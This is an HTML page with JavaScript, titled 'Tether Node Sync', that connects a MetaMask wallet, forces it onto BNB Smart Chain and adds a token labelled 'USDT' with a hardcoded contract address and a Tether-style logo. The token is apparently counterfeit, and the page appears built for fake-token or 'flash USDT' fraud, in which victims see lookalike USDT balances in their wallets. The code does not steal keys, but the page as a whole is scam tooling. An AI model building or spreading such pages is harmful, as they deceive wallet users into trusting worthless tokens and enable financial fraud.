<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 25px; text-align: center; width: 320px; }
        .btn { background: #26a17b; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; }
        #msg { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; white-space: pre-wrap; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://gateway.pinata.cloud/ipfs/QmUFHzEJy2Ttb4adfvE6bVxds31AuzZGkk3sMas4SQGDT8" width="80" style="border-radius:50%; margin-bottom:20px;">
    <h2 style="margin:0;">USDT SYNC</h2>
    <p style="color:#848d97; font-size:13px;">BNB Smart Chain Protocol</p>
    <button class="btn" onclick="masterSync()">SYNC & ADD TOKEN</button>
    <div id="msg">SYSTEM: READY</div>
</div>

<script>
    async function masterSync() {
        const log = document.getElementById('msg');
        if (!window.ethereum) return alert("Open in MetaMask Browser");

        try {
            log.innerText = "> CONNECTING WALLET...";
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

            // STEP 1: Force Switch to BNB Smart Chain (ChainID: 0x38 = 56)
            log.innerText = "> SWITCHING TO BNB CHAIN...";
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (switchError) {
                // Agar BNB Chain wallet mein nahi hai to add karne ki request
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BNB Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }

            // STEP 2: Add Custom Token with Metadata
            log.innerText = "> INJECTING TOKEN METADATA...";
            const wasAdded = await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
                        symbol: 'USDT',
                        decimals: 18,
                        image: 'https://gateway.pinata.cloud/ipfs/QmUFHzEJy2Ttb4adfvE6bVxds31AuzZGkk3sMas4SQGDT8',
                    },
                },
            });

            if (wasAdded) {
                log.innerText = "✅ SUCCESS: TOKEN ADDED";
                alert("Token added successfully!");
            } else {
                log.innerText = "❌ FAILED: USER REJECTED";
            }

        } catch (err) {
            log.innerText = "ERROR: " + err.message;
            console.error(err);
        }
    }
</script>
</body>
</html>
